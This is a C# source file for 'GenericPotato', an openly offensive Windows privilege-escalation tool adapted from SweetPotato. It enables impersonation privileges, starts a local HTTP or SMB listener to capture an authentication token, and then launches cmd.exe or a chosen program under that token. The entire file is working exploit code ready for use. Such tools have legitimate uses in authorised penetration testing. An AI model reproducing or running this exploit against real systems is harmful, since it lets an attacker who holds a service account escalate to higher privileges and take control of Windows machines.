using Microsoft.Win32;
using Mono.Options;
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using static GenericPotato.ImpersonationToken;

namespace GenericPotato {
    class Program {

        static void PrintHelp(OptionSet options) {                
            options.WriteOptionDescriptions(Console.Out);
        }

        static void Main(string[] args) {

            ushort port = 8888;
            string host = "127.0.0.1";
            string program = @"c:\Windows\System32\cmd.exe";
            string programArgs = null;
            ExecutionMethod executionMethod = ExecutionMethod.Auto;
            PotatoAPI.Mode mode = PotatoAPI.Mode.SMB;
            bool showHelp = false;

            Console.WriteLine(
                "GenericPotato by @micahvandeusen\n" +
                 "  Modified from SweetPotato by @_EthicalChaos_\n"
                );

            OptionSet option_set = new OptionSet()
                .Add<ExecutionMethod>("m=|method=", "Auto,User,Thread (default Auto)", v => executionMethod = v)
                .Add("p=|prog=", "Program to launch (default cmd.exe)", v => program = v)
                .Add("a=|args=", "Arguments for program (default null)", v => programArgs = v)
                .Add<PotatoAPI.Mode>("e=|exploit=", "Exploit mode [HTTP|SMB(default)] ", v => mode = v)
                .Add<ushort>("l=|port=", "HTTP port to listen on (default 8888)", v => port = v)
                .Add("i=|host=", "HTTP host to listen on (default 127.0.0.1)", v => host = v)
                .Add("h|help", "Display this help", v => showHelp = v != null);

            try {

                option_set.Parse(args);

                if (showHelp) {
                    PrintHelp(option_set);
                    return;
                }

            } catch (Exception e) {
                Console.WriteLine("[!] Failed to parse arguments: {0}", e.Message);
                PrintHelp(option_set);
                return;
            }

            try {

                bool hasImpersonate = EnablePrivilege(SecurityEntity.SE_IMPERSONATE_NAME);
                bool hasPrimary = EnablePrivilege(SecurityEntity.SE_ASSIGNPRIMARYTOKEN_NAME);
                bool hasIncreaseQuota = EnablePrivilege(SecurityEntity.SE_INCREASE_QUOTA_NAME);

                if(!hasImpersonate && !hasPrimary) {
                    Console.WriteLine("[!] Cannot perform interception, necessary privileges missing.  Are you running under a Service account?");
                    return;
                }

                if (executionMethod == ExecutionMethod.Auto) {
                    if (hasImpersonate) {
                        executionMethod = ExecutionMethod.Token;
                    } else if (hasPrimary) {
                        executionMethod = ExecutionMethod.User;
                    }
                }

                PotatoAPI potatoAPI = new PotatoAPI(port, host, mode);
                potatoAPI.readyEvent.WaitOne(); // Wait for listener to start
                Console.WriteLine($"[+] Listener ready");

                if (!potatoAPI.Trigger())
                {
                    Console.WriteLine("[!] Trigger failed");
                    return;
                }

                potatoAPI.readyEvent.WaitOne(); // Wait for connection

                Console.WriteLine($"[+] Intercepted and authenticated successfully, launching {program}");

                IntPtr impersonatedPrimary;

                if (!DuplicateTokenEx(potatoAPI.Token, TOKEN_ALL_ACCESS, IntPtr.Zero,
                    SECURITY_IMPERSONATION_LEVEL.SecurityIdentification, TOKEN_TYPE.TokenPrimary, out impersonatedPrimary)) {
                    Console.WriteLine("[!] Failed to impersonate security context token");
                    return;
                }

                Thread systemThread = new Thread(() => {
                    SetThreadToken(IntPtr.Zero, potatoAPI.Token);
                    STARTUPINFO si = new STARTUPINFO();
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    si.cb = Marshal.SizeOf(si);
                    si.lpDesktop = @"WinSta0\Default";

                    string finalArgs = null;

                    if(programArgs != null)
                        finalArgs = string.Format("\"{0}\" {1}", program, programArgs);

                    Console.WriteLine($"[+] Running {finalArgs}");
                    if (executionMethod == ExecutionMethod.Token) {
                        if (!CreateProcessWithTokenW(potatoAPI.Token, 0, program, finalArgs, CreationFlags.NewConsole, IntPtr.Zero, null, ref si, out pi)) {
                            Console.WriteLine("[!] Failed to created impersonated process with token: {0}", Marshal.GetLastWin32Error());
                            return;
                        }
                    } else {
                        if (!CreateProcessAsUserW(impersonatedPrimary, program, finalArgs, IntPtr.Zero,
                            IntPtr.Zero, false, CREATE_NEW_CONSOLE, IntPtr.Zero, @"C:\", ref si, out pi)) {
                            Console.WriteLine("[!] Failed to created impersonated process with user: {0} ", Marshal.GetLastWin32Error());
                            return;
                        }
                    }
                    Console.WriteLine("[+] Process created, enjoy!");
                });

                systemThread.Start();
                systemThread.Join();

            } catch (Exception e) {
                Console.WriteLine("[!] Failed to exploit: {0} ", e.Message);
                Console.WriteLine(e.StackTrace.ToString());
            }
        }
    }
}
